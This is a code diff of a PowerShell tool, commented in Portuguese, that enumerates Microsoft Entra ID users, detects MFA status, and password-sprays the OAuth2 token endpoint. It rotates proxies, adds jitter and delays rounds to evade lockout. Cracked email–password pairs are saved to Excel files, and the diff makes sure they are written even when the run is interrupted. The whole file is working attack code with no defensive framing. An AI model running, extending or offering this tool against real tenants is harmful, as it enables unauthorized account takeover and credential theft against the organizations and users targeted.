@@ -117,8 +117,8 @@ function Start-RequestSleep {
 }
 
 Write-Host "===============================================================================" -ForegroundColor DarkGray
-Write-Host "    _____ _   _ _   _ _  __     __  __ ____" -ForegroundColor Cyan
-Write-Host "   | ____| \ | | | | |  \/  |   |  \/  / ___|" -ForegroundColor Cyan
+Write-Host "    _____ _   _ _   _ _  __     __  __ _____" -ForegroundColor Cyan
+Write-Host "   | ____| \ | | | | |  \/  |   |  \/  / ____|" -ForegroundColor Cyan
 Write-Host "   |  _| |  \| | | | | |\/| |   | |\/| \___ \" -ForegroundColor Cyan
 Write-Host "   | |___| |\  | |_| | |  | |   | |  | |___) |" -ForegroundColor Cyan
 Write-Host "   |_____|_| \_|\___/|_|  |_|   |_|  |_|____/" -ForegroundColor Cyan
@@ -186,6 +186,9 @@ $mfaRequeridoResults = New-Object System.Collections.Generic.List[object]
 $bloqueadosResults = New-Object System.Collections.Generic.List[object]
 $outrosResults = New-Object System.Collections.Generic.List[object]
 
+# Flag para evitar exportacao duplicada (finally + fim normal)
+$script:exportDone = $false
+
 function no_question {
     param(
         [switch]$NoQuestion
@@ -199,6 +202,7 @@ function Save-Result {
         [string]$LoginStatus
     )
     $script:allResults.Add($Result) | Out-Null
+
     switch ($LoginStatus) {
         "LOGIN_OK" {
             $script:validosResults.Add($Result) | Out-Null
@@ -213,7 +217,15 @@ function Save-Result {
             $script:bloqueadosResults.Add($Result) | Out-Null
         }
         default {
-            $script:outrosResults.Add($Result) | Out-Null
+            # CORRECAO: usuarios VALIDOS enumerados (ainda nao testados no spray)
+            # tambem vao para validos.xlsx, para que o arquivo nao saia vazio
+            # quando so a Fase 1 (enumeracao) e executada.
+            if ($Result.Status -eq "VALIDO") {
+                $script:validosResults.Add($Result) | Out-Null
+            }
+            else {
+                $script:outrosResults.Add($Result) | Out-Null
+            }
         }
     }
 }
@@ -228,12 +240,58 @@ function Export-XlsxResult {
     if (Test-Path $Path) {
         Remove-Item -Path $Path -Force
     }
-    if ($Data.Count -eq 0) {
+    if ($null -eq $Data -or $Data.Count -eq 0) {
         $Data = @([pscustomobject]@{
             Mensagem = "Sem resultados"
         })
     }
     $Data | Export-Excel -Path $Path -WorksheetName $WorksheetName -AutoSize -BoldTopRow -FreezeTopRow
+}
+
+# =========================================================================
+# CORRECAO PRINCIPAL: toda a exportacao foi movida para esta funcao, que e
+# chamada no bloco finally. Assim, mesmo com Ctrl+C, os dados sao salvos.
+# =========================================================================
+function Save-AllToExcel {
+    if ($script:exportDone) { return }
+    $script:exportDone = $true
+
+    Write-Host "`n[*] Salvando resultados em Excel..." -ForegroundColor Cyan
+
+    $summaryData = @(
+        [pscustomobject]@{ Metrica = "VALIDOS";       Valor = $script:valid },
+        [pscustomobject]@{ Metrica = "INVALIDOS";     Valor = $script:invalid },
+        [pscustomobject]@{ Metrica = "DESCONHECIDOS"; Valor = $script:unknown }
+    )
+
+    try {
+        if (Test-Path $script:outputFile) {
+            Remove-Item -Path $script:outputFile -Force
+        }
+
+        $masterResults = $script:allResults.ToArray()
+        if ($masterResults.Count -eq 0) {
+            $masterResults = @([pscustomobject]@{
+                Mensagem = "Sem resultados"
+            })
+        }
+
+        $masterResults | Export-Excel -Path $script:outputFile -WorksheetName "Resultados" -AutoSize -BoldTopRow -FreezeTopRow
+        $summaryData   | Export-Excel -Path $script:outputFile -WorksheetName "Resumo" -Append -AutoSize -BoldTopRow -FreezeTopRow
+
+        Export-XlsxResult -Path $script:fileValidos        -Data $script:validosResults.ToArray()
+        Export-XlsxResult -Path $script:fileSenhaIncorreta -Data $script:senhaIncorretaResults.ToArray()
+        Export-XlsxResult -Path $script:fileMfaRequerido   -Data $script:mfaRequeridoResults.ToArray()
+        Export-XlsxResult -Path $script:fileBloqueados     -Data $script:bloqueadosResults.ToArray()
+        Export-XlsxResult -Path $script:fileOutros         -Data $script:outrosResults.ToArray()
+        Export-XlsxResult -Path $script:fileResumo         -Data $summaryData -WorksheetName "Resumo"
+
+        Write-Host "[+] Arquivo geral XLSX: $script:outputFile" -ForegroundColor Green
+        Write-Host "[+] Resultados XLSX em: $script:resultDir" -ForegroundColor Green
+    }
+    catch {
+        Write-Host "[ERRO] Falha ao salvar Excel: $($_.Exception.Message)" -ForegroundColor Red
+    }
 }
 
 function Get-ActiveProxyList {
@@ -287,6 +345,7 @@ function Set-RequestProxy {
         Write-Host "[*] Usando proxy: $proxyAtual" -ForegroundColor DarkGray
         return $proxyAtual
     }
+
     $global:PSDefaultParameterValues.Remove("Invoke-RestMethod:Proxy") | Out-Null
     $global:PSDefaultParameterValues.Remove("Invoke-WebRequest:Proxy") | Out-Null
     $global:PSDefaultParameterValues.Remove("Invoke-RestMethod:ProxyUseDefaultCredentials") | Out-Null
@@ -323,300 +382,315 @@ else {
 # Lista de usuarios validos que serao alvo do spray na Fase 2
 $usuariosValidos = New-Object System.Collections.Generic.List[object]
 
-if ($NoValidation) {
-    # =========================================================================
-    # MODO -NoValidation: pula a Fase 1 e usa TODOS os usuarios da wordlist
-    # =========================================================================
-    Write-Host "`n[!] Modo -NoValidation ativo: Fase 1 (enumeracao) IGNORADA." -ForegroundColor Yellow
-    Write-Host "[+] Todos os usuarios da wordlist serao tratados como alvos do spray." -ForegroundColor Cyan
+# =========================================================================
+# CORRECAO Ctrl+C: todo o fluxo principal fica dentro de try/finally.
+# O finally roda mesmo em caso de interrupcao (Ctrl+C), garantindo o save.
+# =========================================================================
+try {
 
-    foreach ($user in Get-Content $UserList) {
-        if ([string]::IsNullOrWhiteSpace($user)) { continue }
-        $email = "$user@$Domain"
-        $usuariosValidos.Add([pscustomobject]@{
-            Email  = $email
-            Status = "NAO_VALIDADO"
-            MFA    = "NAO_DETECTADO"
-        }) | Out-Null
+    if ($NoValidation) {
+        # =========================================================================
+        # MODO -NoValidation: pula a Fase 1 e usa TODOS os usuarios da wordlist
+        # =========================================================================
+        Write-Host "`n[!] Modo -NoValidation ativo: Fase 1 (enumeracao) IGNORADA." -ForegroundColor Yellow
+        Write-Host "[+] Todos os usuarios da wordlist serao tratados como alvos do spray." -ForegroundColor Cyan
+
+        foreach ($user in Get-Content $UserList) {
+            if ([string]::IsNullOrWhiteSpace($user)) { continue }
+            $email = "$user@$Domain"
+            $usuariosValidos.Add([pscustomobject]@{
+                Email  = $email
+                Status = "NAO_VALIDADO"
+                MFA    = "NAO_DETECTADO"
+            }) | Out-Null
+        }
+
+        Write-Host "[+] Usuarios carregados (sem validacao): $($usuariosValidos.Count)" -ForegroundColor Green
     }
+    else {
+        # =========================================================================
+        # FASE 1 - ENUMERACAO DE USUARIOS (existencia + MFA)
+        # =========================================================================
+        Write-Host "`n[+] FASE 1: Enumeracao de usuarios..." -ForegroundColor Cyan
 
-    Write-Host "[+] Usuarios carregados (sem validacao): $($usuariosValidos.Count)" -ForegroundColor Green
-}
-else {
-    # =========================================================================
-    # FASE 1 - ENUMERACAO DE USUARIOS (existencia + MFA)
-    # =========================================================================
-    Write-Host "`n[+] FASE 1: Enumeracao de usuarios..." -ForegroundColor Cyan
+        foreach ($user in Get-Content $UserList) {
+            if ([string]::IsNullOrWhiteSpace($user)) { continue }
+            $email = "$user@$Domain"
+            $body  = @{ Username = $email } | ConvertTo-Json
 
-    foreach ($user in Get-Content $UserList) {
-        if ([string]::IsNullOrWhiteSpace($user)) { continue }
-        $email = "$user@$Domain"
-        $body  = @{ Username = $email } | ConvertTo-Json
+            $status    = "DESCONHECIDO"
+            $mfaStatus = "NAO_DETECTADO"
 
-        $status    = "DESCONHECIDO"
-        $mfaStatus = "NAO_DETECTADO"
+            try {
+                Set-RequestProxy -Proxies $activeProxies | Out-Null
+                $response = Invoke-RestMethod -Method POST `
+                                             -Uri $url `
+                                             -Body $body `
+                                             -ContentType "application/json"
 
-        try {
-            Set-RequestProxy -Proxies $activeProxies | Out-Null
-            $response = Invoke-RestMethod -Method POST `
-                                         -Uri $url `
-                                         -Body $body `
-                                         -ContentType "application/json"
+                if ($response.IfExistsResult -eq 0) {
+                    $status = "VALIDO"
+                    $valid++
+                }
+                elseif ($response.IfExistsResult -eq 1) {
+                    $status = "INVALIDO"
+                    $invalid++
+                }
+                else {
+                    $unknown++
+                }
 
-            if ($response.IfExistsResult -eq 0) {
-                $status = "VALIDO"
-                $valid++
-            }
-            elseif ($response.IfExistsResult -eq 1) {
-                $status = "INVALIDO"
-                $invalid++
-            }
-            else {
-                $unknown++
-            }
+                # =========================
+                # MFA (DETECCAO)
+                # =========================
+                if ($response.PSObject.Properties.Name -contains "IsMfaRegistered" -and $response.IsMfaRegistered) {
+                    $mfaStatus = "MFA_REGISTRADO"
+                }
+                elseif ($response.PSObject.Properties.Name -contains "EstsProperties" -and $response.EstsProperties.MfaRequired) {
+                    $mfaStatus = "MFA_REQUERIDO"
+                }
 
-            # =========================
-            # MFA (DETECCAO)
-            # =========================
-            if ($response.PSObject.Properties.Name -contains "IsMfaRegistered" -and $response.IsMfaRegistered) {
-                $mfaStatus = "MFA_REGISTRADO"
-            }
-            elseif ($response.PSObject.Properties.Name -contains "EstsProperties" -and $response.EstsProperties.MfaRequired) {
-                $mfaStatus = "MFA_REQUERIDO"
-            }
-
-            if ($response.PSObject.Properties.Name -contains "Credentials") {
-                foreach ($cred in $response.Credentials) {
-                    if ($cred.Type -in @("PhoneApp","OneWaySms","TwoWaySms")) {
-                        $mfaStatus = "MFA_DETECTADO"
-                        break
+                if ($response.PSObject.Properties.Name -contains "Credentials") {
+                    foreach ($cred in $response.Credentials) {
+                        if ($cred.Type -in @("PhoneApp","OneWaySms","TwoWaySms")) {
+                            $mfaStatus = "MFA_DETECTADO"
+                            break
+                        }
                     }
                 }
-            }
 
-            if ($response.PSObject.Properties.Name -contains "ThrottleStatus" -and $response.ThrottleStatus -eq 1) {
-                $mfaStatus = "MFA_POSSIVEL"
-            }
+                if ($response.PSObject.Properties.Name -contains "ThrottleStatus" -and $response.ThrottleStatus -eq 1) {
+                    $mfaStatus = "MFA_POSSIVEL"
+                }
 
-            # Output da enumeracao
-            Write-Host "$email -> " -ForegroundColor DarkGray -NoNewline
-            $statusColor = if ($status -eq "VALIDO") { "Yellow" } else { "DarkGray" }
-            Write-Host "$status | " -ForegroundColor $statusColor -NoNewline
-            $mfaColor = switch ($mfaStatus) {
-                "MFA_REQUERIDO"  { "Blue" }
-                "MFA_DETECTADO" { "Yellow" }
-                default         { "DarkGray" }
-            }
-            Write-Host "MFA: $mfaStatus" -ForegroundColor $mfaColor
+                # Output da enumeracao
+                Write-Host "$email -> " -ForegroundColor DarkGray -NoNewline
+                $statusColor = if ($status -eq "VALIDO") { "Yellow" } else { "DarkGray" }
+                Write-Host "$status | " -ForegroundColor $statusColor -NoNewline
+                $mfaColor = switch ($mfaStatus) {
+                    "MFA_REQUERIDO"  { "Blue" }
+                    "MFA_DETECTADO" { "Yellow" }
+                    default         { "DarkGray" }
+                }
+                Write-Host "MFA: $mfaStatus" -ForegroundColor $mfaColor
 
-            if ($status -eq "VALIDO") {
-                $usuariosValidos.Add([pscustomobject]@{
-                    Email  = $email
-                    Status = $status
-                    MFA    = $mfaStatus
-                }) | Out-Null
-            }
-            else {
-                # Registra usuarios nao validos ja no resultado final
-                Save-Result -Result ([pscustomobject]@{
-                    DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                    Email       = $email
-                    Status      = $status
-                    MFA         = $mfaStatus
-                    LoginStatus = "NAO_TESTADO"
-                    Senha       = ""
-                }) -LoginStatus "NAO_TESTADO"
-            }
-        }
-        catch {
-            Write-Host "$email -> ERRO" -ForegroundColor Red
-            Save-Result -Result ([pscustomobject]@{
-                DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                Email       = $email
-                Status      = "ERRO"
-                MFA         = "NAO_DETECTADO"
-                LoginStatus = "ERRO"
-                Senha       = ""
-            }) -LoginStatus "ERRO"
-        }
+                if ($status -eq "VALIDO") {
+                    $usuariosValidos.Add([pscustomobject]@{
+                        Email  = $email
+                        Status = $status
+                        MFA    = $mfaStatus
+                    }) | Out-Null
 
-        # Timeout (com jitter) entre cada requisicao de enumeracao
-        Start-RequestSleep
-    }
-
-    Write-Host "`n[+] Enumeracao concluida. Usuarios validos: $($usuariosValidos.Count)" -ForegroundColor Green
-}
-
-# =========================================================================
-# FASE 2 - PASSWORD SPRAYING (senha por fora, usuario por dentro)
-# =========================================================================
-$doSpray = $false
-
-if ($TestLogin -and $usuariosValidos.Count -gt 0) {
-    if (no_question -NoQuestion $NoQuestion) {
-        $doSpray = $true
-    }
-    else {
-        Write-Host "`n----------------------------------------`n"
-        Write-Host "[?] Iniciar password spraying em $($usuariosValidos.Count) usuario(s)?" -ForegroundColor Yellow
-        $choice = Read-Host "[y/N]"
-        if ($choice -eq "y") { $doSpray = $true }
-    }
-}
-
-if ($doSpray) {
-    if (!(Test-Path $PassList)) {
-        Write-Host "[ERRO] Arquivo de senhas nao encontrado: $PassList" -ForegroundColor Red
-    }
-    else {
-        $listaSenhas = @(Get-Content $PassList | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
-
-        Write-Host "`n[+] FASE 2: Password spraying" -ForegroundColor Cyan
-        Write-Host "[+] Senhas a testar: $($listaSenhas.Count) | Usuarios alvo: $($usuariosValidos.Count)" -ForegroundColor Cyan
-        if ($SprayDelay -gt 0) {
-            Write-Host "[+] Pausa entre rodadas de senha: $SprayDelay minuto(s)" -ForegroundColor Cyan
-        }
-
-        # Resolve o TenantID / token endpoint uma unica vez
-        $tokenUrl = $null
-        try {
-            Set-RequestProxy -Proxies $activeProxies | Out-Null
-            $tenantResponse = Invoke-RestMethod `
-                -Uri "https://login.microsoftonline.com/$Domain/.well-known/openid-configuration" `
-                -ErrorAction Stop
-            $tenantId = $tenantResponse.token_endpoint.Split('/')[3]
-            $tokenUrl = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
-        } catch {
-            Write-Host "[ERRO] Falha ao resolver o token endpoint do dominio $Domain" -ForegroundColor Red
-            Write-Host "[Exception.Message]" -ForegroundColor Yellow
-            Write-Host $_.Exception.Message -ForegroundColor Yellow
-            if ($_.ErrorDetails -and $_.ErrorDetails.Message ) {
-                Write-Host "[ErrorDetails.Message]" -ForegroundColor Cyan
-                Write-Host $_.ErrorDetails.Message -ForegroundColor Cyan
-            }
-            Write-Host "[Proxy atual]" -ForegroundColor DarkGray
-            Write-Host $global:PSDefaultParameterValues["Invoke-RestMethod:Proxy"] -ForegroundColor DarkGray
-            Save-Result -Result ([pscustomobject]@{
-                DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                Email       = "-"
-                Status      = "ERRO"
-                MFA         = "NAO_DETECTADO"
-                LoginStatus = "ERRO"
-                Senha       = ""
-            }) -LoginStatus "ERRO"
-        }
-
-        if ($tokenUrl) {
-            # Guarda os emails que ja tiveram sucesso para nao testa-los de novo
-            $usuariosComprometidos = New-Object System.Collections.Generic.HashSet[string]
-            $totalSenhas = $listaSenhas.Count
-            $idxSenha = 0
-
-            foreach ($plainPass in $listaSenhas) {
-                $idxSenha++
-                Write-Host "`n=========================================" -ForegroundColor DarkGray
-                Write-Host "[SPRAY $idxSenha/$totalSenhas] Testando senha: $plainPass" -ForegroundColor Cyan
-                Write-Host "=========================================" -ForegroundColor DarkGray
-
-                foreach ($alvo in $usuariosValidos) {
-                    $email     = $alvo.Email
-                    $status    = $alvo.Status
-                    $mfaStatus = $alvo.MFA
-
-                    # Pula usuarios ja comprometidos
-                    if ($usuariosComprometidos.Contains($email)) { continue }
-
-                    $loginStatus = "NAO_TESTADO"
-                    try {
-                        Set-RequestProxy -Proxies $activeProxies | Out-Null
-
-                        $body = @{
-                            client_id  = $ClientId
-                            scope      = "https://graph.microsoft.com/.default"
-                            username   = $email
-                            password   = $plainPass
-                            grant_type = "password"
-                        }
-
-                        $tokenResponse = Invoke-RestMethod -Method POST -Uri $tokenUrl -Body $body -ErrorAction Stop
-
-                        if ($tokenResponse.access_token) {
-                            $loginStatus = "LOGIN_OK"
-                            $usuariosComprometidos.Add($email) | Out-Null
-                            Write-Host "[OK] Sucesso: $email : $plainPass" -ForegroundColor Green
-                        }
-                    }
-                    catch {
-                        $errorResponse = $_.ErrorDetails.Message
-                        if (-not $errorResponse) { $errorResponse = $_.Exception.Message }
-
-                        try {
-                            $errorJson = $errorResponse | ConvertFrom-Json
-                            $errorDesc = $errorJson.error_description
-
-                            switch -Regex ($errorDesc) {
-                                "AADSTS50126" {
-                                    $loginStatus = "SENHA_INCORRETA"
-                                }
-                                "AADSTS50076|AADSTS50079" {
-                                    $loginStatus = "LOGIN_OK MAS MFA REQUERIDO"
-                                    if ($mfaStatus -eq "NAO_DETECTADO") { $mfaStatus = "MFA_REQUERIDO" }
-                                    # Senha correta (barrada no MFA) => nao testa mais esse user
-                                    $usuariosComprometidos.Add($email) | Out-Null
-                                }
-                                "AADSTS50053" {
-                                    $loginStatus = "CONTA_BLOQUEADA"
-                                    # Conta bloqueada => remove do spray para nao piorar
-                                    $usuariosComprometidos.Add($email) | Out-Null
-                                }
-                                "AADSTS50034" {
-                                    $loginStatus = "USUARIO_NAO_ENCONTRADO"
-                                    $usuariosComprometidos.Add($email) | Out-Null
-                                }
-                                default { $loginStatus = "ERRO" }
-                            }
-                        }
-                        catch {
-                            $loginStatus = "ERRO"
-                        }
-                    }
-
-                    # Log da tentativa
-                    $loginColor = $loginStatusColors[$loginStatus]
-                    if (-not $loginColor) { $loginColor = "DarkGray" }
-                    Write-Host "  $email -> $loginStatus" -ForegroundColor $loginColor
-
+                    # CORRECAO: persiste o usuario VALIDO enumerado nos resultados
+                    # (antes ele so ia para $usuariosValidos e o Excel saia vazio).
                     Save-Result -Result ([pscustomobject]@{
                         DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                         Email       = $email
                         Status      = $status
                         MFA         = $mfaStatus
-                        LoginStatus = $loginStatus
-                        Senha       = $plainPass
-                    }) -LoginStatus $loginStatus
-
-                    # Timeout (com jitter) entre cada requisicao de login
-                    Start-RequestSleep
-                } # Fim do foreach usuarios
-
-                # Pausa longa entre rodadas de senha (respeita janela de lockout)
-                # Nao aguarda apos a ultima senha
-                if ($SprayDelay -gt 0 -and $idxSenha -lt $totalSenhas) {
-                    Write-Host "`n[*] Aguardando $SprayDelay minuto(s) antes da proxima senha (janela de lockout)..." -ForegroundColor Gray
-                    Start-Sleep -Seconds ($SprayDelay * 60)
+                        LoginStatus = "NAO_TESTADO"
+                        Senha       = ""
+                    }) -LoginStatus "NAO_TESTADO"
                 }
-            } # Fim do foreach senhas
+                else {
+                    # Registra usuarios nao validos ja no resultado final
+                    Save-Result -Result ([pscustomobject]@{
+                        DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                        Email       = $email
+                        Status      = $status
+                        MFA         = $mfaStatus
+                        LoginStatus = "NAO_TESTADO"
+                        Senha       = ""
+                    }) -LoginStatus "NAO_TESTADO"
+                }
+            }
+            catch {
+                Write-Host "$email -> ERRO" -ForegroundColor Red
+                Save-Result -Result ([pscustomobject]@{
+                    DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    Email       = $email
+                    Status      = "ERRO"
+                    MFA         = "NAO_DETECTADO"
+                    LoginStatus = "ERRO"
+                    Senha       = ""
+                }) -LoginStatus "ERRO"
+            }
+
+            # Timeout (com jitter) entre cada requisicao de enumeracao
+            Start-RequestSleep
+        }
+
+        Write-Host "`n[+] Enumeracao concluida. Usuarios validos: $($usuariosValidos.Count)" -ForegroundColor Green
+    }
+
+    # =========================================================================
+    # FASE 2 - PASSWORD SPRAYING (senha por fora, usuario por dentro)
+    # =========================================================================
+    $doSpray = $false
+    if ($TestLogin -and $usuariosValidos.Count -gt 0) {
+        if (no_question -NoQuestion $NoQuestion) {
+            $doSpray = $true
+        }
+        else {
+            Write-Host "`n----------------------------------------`n"
+            Write-Host "[?] Iniciar password spraying em $($usuariosValidos.Count) usuario(s)?" -ForegroundColor Yellow
+            $choice = Read-Host "[y/N]"
+            if ($choice -eq "y") { $doSpray = $true }
         }
     }
-}
-elseif ($TestLogin -and $usuariosValidos.Count -eq 0) {
-    Write-Host "`n[!] Nenhum usuario alvo encontrado. Spray nao sera executado." -ForegroundColor Yellow
-}
 
-# =========================
-# RESUMO
-# =========================
-$summary = @"
+    if ($doSpray) {
+        if (!(Test-Path $PassList)) {
+            Write-Host "[ERRO] Arquivo de senhas nao encontrado: $PassList" -ForegroundColor Red
+        }
+        else {
+            $listaSenhas = @(Get-Content $PassList | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
+            Write-Host "`n[+] FASE 2: Password spraying" -ForegroundColor Cyan
+            Write-Host "[+] Senhas a testar: $($listaSenhas.Count) | Usuarios alvo: $($usuariosValidos.Count)" -ForegroundColor Cyan
+            if ($SprayDelay -gt 0) {
+                Write-Host "[+] Pausa entre rodadas de senha: $SprayDelay minuto(s)" -ForegroundColor Cyan
+            }
+
+            # Resolve o TenantID / token endpoint uma unica vez
+            $tokenUrl = $null
+            try {
+                Set-RequestProxy -Proxies $activeProxies | Out-Null
+                $tenantResponse = Invoke-RestMethod `
+                    -Uri "https://login.microsoftonline.com/$Domain/.well-known/openid-configuration" `
+                    -ErrorAction Stop
+                $tenantId = $tenantResponse.token_endpoint.Split('/')[3]
+                $tokenUrl = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
+            } catch {
+                Write-Host "[ERRO] Falha ao resolver o token endpoint do dominio $Domain" -ForegroundColor Red
+                Write-Host "[Exception.Message]" -ForegroundColor Yellow
+                Write-Host $_.Exception.Message -ForegroundColor Yellow
+                if ($_.ErrorDetails -and $_.ErrorDetails.Message ) {
+                    Write-Host "[ErrorDetails.Message]" -ForegroundColor Cyan
+                    Write-Host $_.ErrorDetails.Message -ForegroundColor Cyan
+                }
+                Write-Host "[Proxy atual]" -ForegroundColor DarkGray
+                Write-Host $global:PSDefaultParameterValues["Invoke-RestMethod:Proxy"] -ForegroundColor DarkGray
+
+                Save-Result -Result ([pscustomobject]@{
+                    DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    Email       = "-"
+                    Status      = "ERRO"
+                    MFA         = "NAO_DETECTADO"
+                    LoginStatus = "ERRO"
+                    Senha       = ""
+                }) -LoginStatus "ERRO"
+            }
+
+            if ($tokenUrl) {
+                # Guarda os emails que ja tiveram sucesso para nao testa-los de novo
+                $usuariosComprometidos = New-Object System.Collections.Generic.HashSet[string]
+
+                $totalSenhas = $listaSenhas.Count
+                $idxSenha = 0
+
+                foreach ($plainPass in $listaSenhas) {
+                    $idxSenha++
+                    Write-Host "`n=========================================" -ForegroundColor DarkGray
+                    Write-Host "[SPRAY $idxSenha/$totalSenhas] Testando senha: $plainPass" -ForegroundColor Cyan
+                    Write-Host "=========================================" -ForegroundColor DarkGray
+
+                    foreach ($alvo in $usuariosValidos) {
+                        $email     = $alvo.Email
+                        $status    = $alvo.Status
+                        $mfaStatus = $alvo.MFA
+
+                        # Pula usuarios ja comprometidos
+                        if ($usuariosComprometidos.Contains($email)) { continue }
+
+                        $loginStatus = "NAO_TESTADO"
+
+                        try {
+                            Set-RequestProxy -Proxies $activeProxies | Out-Null
+                            $body = @{
+                                client_id  = $ClientId
+                                scope      = "https://graph.microsoft.com/.default"
+                                username   = $email
+                                password   = $plainPass
+                                grant_type = "password"
+                            }
+
+                            $tokenResponse = Invoke-RestMethod -Method POST -Uri $tokenUrl -Body $body -ErrorAction Stop
+
+                            if ($tokenResponse.access_token) {
+                                $loginStatus = "LOGIN_OK"
+                                $usuariosComprometidos.Add($email) | Out-Null
+                                Write-Host "[OK] Sucesso: $email : $plainPass" -ForegroundColor Green
+                            }
+                        }
+                        catch {
+                            $errorResponse = $_.ErrorDetails.Message
+                            if (-not $errorResponse) { $errorResponse = $_.Exception.Message }
+                            try {
+                                $errorJson = $errorResponse | ConvertFrom-Json
+                                $errorDesc = $errorJson.error_description
+                                switch -Regex ($errorDesc) {
+                                    "AADSTS50126" {
+                                        $loginStatus = "SENHA_INCORRETA"
+                                    }
+                                    "AADSTS50076|AADSTS50079" {
+                                        $loginStatus = "LOGIN_OK MAS MFA REQUERIDO"
+                                        if ($mfaStatus -eq "NAO_DETECTADO") { $mfaStatus = "MFA_REQUERIDO" }
+                                        # Senha correta (barrada no MFA) => nao testa mais esse user
+                                        $usuariosComprometidos.Add($email) | Out-Null
+                                    }
+                                    "AADSTS50053" {
+                                        $loginStatus = "CONTA_BLOQUEADA"
+                                        # Conta bloqueada => remove do spray para nao piorar
+                                        $usuariosComprometidos.Add($email) | Out-Null
+                                    }
+                                    "AADSTS50034" {
+                                        $loginStatus = "USUARIO_NAO_ENCONTRADO"
+                                        $usuariosComprometidos.Add($email) | Out-Null
+                                    }
+                                    default { $loginStatus = "ERRO" }
+                                }
+                            }
+                            catch {
+                                $loginStatus = "ERRO"
+                            }
+                        }
+
+                        # Log da tentativa
+                        $loginColor = $loginStatusColors[$loginStatus]
+                        if (-not $loginColor) { $loginColor = "DarkGray" }
+                        Write-Host "  $email -> $loginStatus" -ForegroundColor $loginColor
+
+                        Save-Result -Result ([pscustomobject]@{
+                            DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                            Email       = $email
+                            Status      = $status
+                            MFA         = $mfaStatus
+                            LoginStatus = $loginStatus
+                            Senha       = $plainPass
+                        }) -LoginStatus $loginStatus
+
+                        # Timeout (com jitter) entre cada requisicao de login
+                        Start-RequestSleep
+                    } # Fim do foreach usuarios
+
+                    # Pausa longa entre rodadas de senha (respeita janela de lockout)
+                    # Nao aguarda apos a ultima senha
+                    if ($SprayDelay -gt 0 -and $idxSenha -lt $totalSenhas) {
+                        Write-Host "`n[*] Aguardando $SprayDelay minuto(s) antes da proxima senha (janela de lockout)..." -ForegroundColor Gray
+                        Start-Sleep -Seconds ($SprayDelay * 60)
+                    }
+                } # Fim do foreach senhas
+            }
+        }
+    }
+    elseif ($TestLogin -and $usuariosValidos.Count -eq 0) {
+        Write-Host "`n[!] Nenhum usuario alvo encontrado. Spray nao sera executado." -ForegroundColor Yellow
+    }
+
+    # =========================
+    # RESUMO (apenas exibicao)
+    # =========================
+    $summary = @"
 =========================
 RESUMO
 =========================
@@ -625,34 +699,10 @@ INVALIDOS:     $invalid
 DESCONHECIDOS: $unknown
 =========================
 "@
-Write-Host "`n$summary" -ForegroundColor Cyan
+    Write-Host "`n$summary" -ForegroundColor Cyan
 
-$summaryData = @(
-    [pscustomobject]@{ Metrica = "VALIDOS"; Valor = $valid },
-    [pscustomobject]@{ Metrica = "INVALIDOS"; Valor = $invalid },
-    [pscustomobject]@{ Metrica = "DESCONHECIDOS"; Valor = $unknown }
-)
-
-if (Test-Path $outputFile) {
-    Remove-Item -Path $outputFile -Force
 }
-
-$masterResults = $allResults.ToArray()
-if ($masterResults.Count -eq 0) {
-    $masterResults = @([pscustomobject]@{
-        Mensagem = "Sem resultados"
-    })
+finally {
+    # Executa SEMPRE: no fim normal do script E em caso de Ctrl+C.
+    Save-AllToExcel
 }
-
-$masterResults | Export-Excel -Path $outputFile -WorksheetName "Resultados" -AutoSize -BoldTopRow -FreezeTopRow
-$summaryData | Export-Excel -Path $outputFile -WorksheetName "Resumo" -Append -AutoSize -BoldTopRow -FreezeTopRow
-
-Export-XlsxResult -Path $fileValidos -Data $validosResults.ToArray()
-Export-XlsxResult -Path $fileSenhaIncorreta -Data $senhaIncorretaResults.ToArray()
-Export-XlsxResult -Path $fileMfaRequerido -Data $mfaRequeridoResults.ToArray()
-Export-XlsxResult -Path $fileBloqueados -Data $bloqueadosResults.ToArray()
-Export-XlsxResult -Path $fileOutros -Data $outrosResults.ToArray()
-Export-XlsxResult -Path $fileResumo -Data $summaryData -WorksheetName "Resumo"
-
-Write-Host "[+] Arquivo geral XLSX: $outputFile" -ForegroundColor Green
-Write-Host "[+] Resultados XLSX em: $resultDir" -ForegroundColor Green
